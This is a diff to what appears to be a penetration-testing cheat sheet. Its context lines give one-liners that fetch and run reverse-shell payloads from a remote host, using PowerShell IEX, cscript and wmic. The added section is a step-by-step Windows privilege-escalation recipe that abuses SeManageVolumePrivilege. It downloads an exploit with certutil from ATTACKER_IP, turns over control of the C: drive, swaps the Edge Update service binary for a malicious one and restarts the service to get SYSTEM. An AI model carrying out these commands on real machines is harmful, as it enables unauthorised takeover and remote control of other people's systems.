@@ -192,3 +192,40 @@ cscript	cscript //E:javascript \\IP\rev.js
 wmic	wmic process call create "cmd /c reverse.exe"
 
 powershell	powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://IP/rev.ps1')
+
+
+## SePrivielge exploits
+
+#### semanagevolumeprivilege
+Step-by-step instructions
+Confirm the user has the SeManageVolumePrivilege using:
+whoami /priv
+
+Look for SeManageVolumePrivilege in the output. 
+Obtain or compile an exploit tool such as:
+CsEnox/SeManageVolumeExploit
+xct/SeManageVolumeAbuse
+Upload the compiled exploit binary (e.g., SeManageVolumeExploit.exe) to the target system using:
+certutil -urlcache -split -f "http://ATTACKER_IP/SeManageVolumeExploit.exe"
+
+Run the exploit to trigger the FSCTL_SD_GLOBAL_CHANGE control code:
+SeManageVolumeExploit.exe
+
+This replaces the Administrators SID (S-1-5-32-544) with the Users SID (S-1-5-32-545) across the entire C: drive. 
+Verify file system permissions are altered using:
+icacls "C:\Program Files\SomeService\service.exe"
+
+You should now see BUILTIN\Users:(F) (Full Control). 
+Replace a privileged service binary (e.g., edgeupdate.exe) with a malicious executable:
+ren "C:\Program Files\Microsoft\Edge Update\edgeupdate.exe" edgeupdate.exe.old
+copy "C:\Tools\malicious.exe" "C:\Program Files\Microsoft\Edge Update\edgeupdate.exe"
+
+Restart the service to execute the payload as SYSTEM:
+sc stop "edgeupdate"
+sc start "edgeupdate"
+
+Alternatively, wait for system reboot.
+Gain a SYSTEM shell via your payload (e.g., reverse shell, user creation, etc.).
+
+
+
